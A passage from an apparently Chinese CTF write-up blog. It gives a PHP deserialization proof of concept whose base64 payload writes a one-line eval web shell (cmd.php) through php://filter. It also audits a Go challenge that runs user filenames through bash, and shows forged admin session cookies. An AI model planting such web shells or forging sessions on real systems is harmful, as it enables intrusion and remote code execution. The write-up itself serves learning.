<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$barking</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$part1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$part2</span>;<br>&#125;<br><br><span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$poc</span>-&gt;barking = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>();<br><span class="hljs-variable">$poc</span>-&gt;barking-&gt;part1 = <span class="hljs-string">&#x27;php://filter/write=convert.base64-decode/resource=cmd.php&#x27;</span>;<br><span class="hljs-variable">$poc</span>-&gt;barking-&gt;part2 = <span class="hljs-string">&#x27;aaPD9waHAgQGV2YWwoJF9QT1NUWydoeWJjeCddKTs/Pg==&#x27;</span>; <span class="hljs-comment">//注意这里前面有两个字符aa</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231031202036768.png'><img src="image-20231031202036768.png" alt="image-20231031202036768"></p>
<p>上传访问即可</p>
<p class='item-img' data-src='image-20231031202111335.png'><img src="image-20231031202111335.png" alt="image-20231031202111335"></p>
<p>拿到flag</p>
<p>另外的各种姿势还可参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yokan/p/12650702.html">file_put_contents利用技巧(php://filter协议)</a></p>
<h3 id="WEEK3-gogogo"><a href="#WEEK3-gogogo" class="headerlink" title="WEEK3-gogogo"></a>[WEEK3]gogogo</h3>
<p>这道题根据附件来看是一道go语言审计题目，这也是第一次遇见。。。先自己审计一波</p>
<p>main.go</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>	<span class="hljs-string">&quot;main/route&quot;</span><br><br>	<span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>	r := gin.Default()<br>	r.GET(<span class="hljs-string">&quot;/&quot;</span>, route.Index)<br>	r.GET(<span class="hljs-string">&quot;/readflag&quot;</span>, route.Readflag)<br>	r.Run(<span class="hljs-string">&quot;0.0.0.0:8000&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure>
<p>route.go</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> route<br><br><span class="hljs-keyword">import</span> (<br>	<span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br>	<span class="hljs-string">&quot;github.com/gorilla/sessions&quot;</span><br>	<span class="hljs-string">&quot;main/readfile&quot;</span><br>	<span class="hljs-string">&quot;net/http&quot;</span><br>	<span class="hljs-string">&quot;os&quot;</span><br>	<span class="hljs-string">&quot;regexp&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> store = sessions.NewCookieStore([]<span class="hljs-type">byte</span>(os.Getenv(<span class="hljs-string">&quot;SESSION_KEY&quot;</span>)))<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Index</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>	session, err := store.Get(c.Request, <span class="hljs-string">&quot;session-name&quot;</span>)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br>	<span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-literal">nil</span> &#123;<br>		session.Values[<span class="hljs-string">&quot;name&quot;</span>] = <span class="hljs-string">&quot;User&quot;</span><br>		err = session.Save(c.Request, c.Writer)<br>		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>			http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br>			<span class="hljs-keyword">return</span><br>		&#125;<br>	&#125;<br><br>	c.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;Hello, User. How to become admin?&quot;</span>)<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Readflag</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>	session, err := store.Get(c.Request, <span class="hljs-string">&quot;session-name&quot;</span>)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br>	<span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-string">&quot;admin&quot;</span> &#123;<br>		c.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;Congratulation! You are admin,But how to get flag?\n&quot;</span>)<br><br>		path := c.Query(<span class="hljs-string">&quot;filename&quot;</span>)<br><br>		reg := regexp.MustCompile(<span class="hljs-string">`[b-zA-Z_@#%^&amp;*:&#123;|&#125;+&lt;&gt;&quot;;\[\]]`</span>)<br><br>		<span class="hljs-keyword">if</span> reg.MatchString(path) &#123;<br><br>			http.Error(c.Writer, <span class="hljs-string">&quot;nonono&quot;</span>, http.StatusInternalServerError)<br>			<span class="hljs-keyword">return</span><br>		&#125;<br><br>		<span class="hljs-keyword">var</span> data []<span class="hljs-type">byte</span><br>		<span class="hljs-keyword">if</span> path != <span class="hljs-string">&quot;&quot;</span> &#123;<br>			data = readfile.ReadFile(path)<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			data = []<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;请传入参数&quot;</span>)<br>		&#125;<br><br>		c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<br>			<span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-string">&quot;read: &quot;</span> + <span class="hljs-type">string</span>(data),<br>		&#125;)<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		c.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;Hello, User. How to become admin?&quot;</span>)<br>	&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
<p>readfile.go</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> readfile<br><br><span class="hljs-keyword">import</span> (<br>	<span class="hljs-string">&quot;os/exec&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ReadFile</span><span class="hljs-params">(path <span class="hljs-type">string</span>)</span></span> (string2 []<span class="hljs-type">byte</span>) &#123;<br>	<span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>		panic_err := <span class="hljs-built_in">recover</span>()<br>		<span class="hljs-keyword">if</span> panic_err != <span class="hljs-literal">nil</span> &#123;<br><br>		&#125;<br>	&#125;()<br>	cmd := exec.Command(<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;strings  &quot;</span>+path)<br>	string2, err := cmd.Output()<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		string2 = []<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;文件不存在&quot;</span>)<br>	&#125;<br>	<span class="hljs-keyword">return</span> string2<br>&#125;<br></code></pre></td></tr></table></figure>
<p>看了一波感觉是session伪构造，其中要求我们的name为admin才能有读取flag的权限，但是session.name是加密过的：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> store = sessions.NewCookieStore([]<span class="hljs-type">byte</span>(os.Getenv(<span class="hljs-string">&quot;SESSION_KEY&quot;</span>)))<br></code></pre></td></tr></table></figure>
<p>这里看到是以session_key密钥加密，这时候神奇的思路就来了，佬们都直接盲猜题目没有该环境变量，于是想着直接搭建到本地运行得到session，在此之前我们看一下这个</p>
<p class='item-img' data-src='image-20231031212206314.png'><img src="image-20231031212206314.png" alt="image-20231031212206314"></p>
<p>可以看到我们当前的name为User根据上述index处的代码我们知道当name=nil的时候，才会赋值为User，这说明在此之前我们的name一定是nil，此时如果我们修改这个代码</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">session.Values[<span class="hljs-string">&quot;name&quot;</span>] = <span class="hljs-string">&quot;User&quot;</span><br>改为<br>session.Values[<span class="hljs-string">&quot;name&quot;</span>] = <span class="hljs-string">&quot;admin&quot;</span><br></code></pre></td></tr></table></figure>
<p>那此时运行完之后我们的session.name一定是admin，思路打通了，那直接本地搭建即可</p>
<p>这里也是搭建了很长时间，一直报错。。。但功夫不负有心人还是搭建好了</p>
<p class='item-img' data-src='image-20231031223645605.png'><img src="image-20231031223645605.png" alt="image-20231031223645605"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">MTY5ODc2Mjk1NHxEWDhFQVFMX2dBQUJFQUVRQUFBaV80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJnQUVWWE5sY2c9PXwIajflC8tQIWBj_C6y_TRCb3QZo-mQ9nhVjtatkQ3nbg==<br><br>MTY5ODc1NDk2OHxEdi1CQkFFQ180SUFBUkFCRUFBQUl2LUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBWUFCRlZ6WlhJPXzzzlJr4E_S8XnoBRbpogEHKAVkSrz_YsNvqNpca0wA6g==<br><br>MTY5ODc2Mjk1NHxEWDhFQVFMX2dBQUJFQUVRQUFBaV80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJnQUVWWE5sY2c9PXwIajflC8tQIWBj_C6y_TRCb3QZo-mQ9nhVjtatkQ3nbg==<br></code></pre></td></tr></table></figure>
<p>我们访问127.0.0.1:8000得到session，如上所示，最后看一下readfile函数</p>
<p class='item-img' data-src='image-20231031224029185.png'><img src="image-20231031224029185.png" alt="image-20231031224029185"></p>
<p>这里看了wp发现filename是get传参，然后是一个正则过滤</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2>
<h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3>
<p>发现是base128，两次base64解码即可</p>
<p class='item-img' data-src='image-20231118225505778.png'><img src="image-20231118225505778.png" alt="image-20231118225505778"></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/10/03/Zhuanxv/">← 下一篇 Zhuanxv</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/10/01/i-got-id-200/">i-got-id-200 上一篇 →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">0x02 玩转题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">2.1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WEEK1-%E9%A3%9E%E6%9C%BA%E5%A4%A7%E6%88%98"><span class="toc-number">2.1.1.</span> <span class="toc-text">[WEEK1]飞机大战</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEEK1-babyRCE"><span class="toc-number">2.1.2.</span> <span class="toc-text">[WEEK1]babyRCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%AD%E6%8B%AC%E5%8F%B7%E5%8C%B9%E9%85%8D%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">[]中括号匹配绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEEK1-%E7%99%BB%E5%BD%95%E5%B0%B1%E7%BB%99flag"><span class="toc-number">2.1.3.</span> <span class="toc-text">[WEEK1]登录就给flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEEK1-%E7%94%9F%E6%88%90%E4%BD%A0%E7%9A%84%E9%82%80%E8%AF%B7%E5%87%BD%E5%90%A7"><span class="toc-number">2.1.4.</span> <span class="toc-text">[WEEK1]生成你的邀请函吧~</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEEK1-1zzphp"><span class="toc-number">2.1.5.</span> <span class="toc-text">[WEEK1]1zzphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEEK1-ez-serialize"><span class="toc-number">2.1.6.</span> <span class="toc-text">[WEEK1]ez_serialize</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEEK1-ezphp"><span class="toc-number">2.1.7.</span> <span class="toc-text">[WEEK1]ezphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEEK2-no-wake-up"><span class="toc-number">2.1.8.</span> <span class="toc-text">[WEEK2]no_wake_up</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEEK2-ez-ssti"><span class="toc-number">2.1.9.</span> <span class="toc-text">[WEEK2]ez_ssti</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEEK2-EasyCMS"><span class="toc-number">2.1.10.</span> <span class="toc-text">[WEEK2]EasyCMS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9Asql%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.1.10.1.</span> <span class="toc-text">方法一：sql命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">2.1.10.2.</span> <span class="toc-text">方法二：文件上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">2.1.10.3.</span> <span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEEK2-serialize"><span class="toc-number">2.1.11.</span> <span class="toc-text">[WEEK2]serialize</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEEK2-MD5%E7%9A%84%E4%BA%8B%E5%B0%B1%E6%8B%9C%E6%89%98%E4%BA%86"><span class="toc-number">2.1.12.</span> <span class="toc-text">[WEEK2]MD5的事就拜托了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEEK2-ez-rce"><span class="toc-number">2.1.13.</span> <span class="toc-text">[WEEK2]ez_rce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEEK3-%E5%BF%AB%E9%97%AE%E5%BF%AB%E7%AD%94"><span class="toc-number">2.1.14.</span> <span class="toc-text">[WEEK3]快问快答</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEEK3-sseerriiaalliizzee"><span class="toc-number">2.1.15.</span> <span class="toc-text">[WEEK3]sseerriiaalliizzee</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEEK3-gogogo"><span class="toc-number">2.1.16.</span> <span class="toc-text">[WEEK3]gogogo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">2.2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-number">2.2.1.</span> <span class="toc-text">签到题</span></a></li></ol></li></ol></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
window.waline = init;
</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
 waline({
   el: '#waline',
   dark: ':root[theme-mode="dark"]',
   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
   path: window.location.pathname,
 });document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>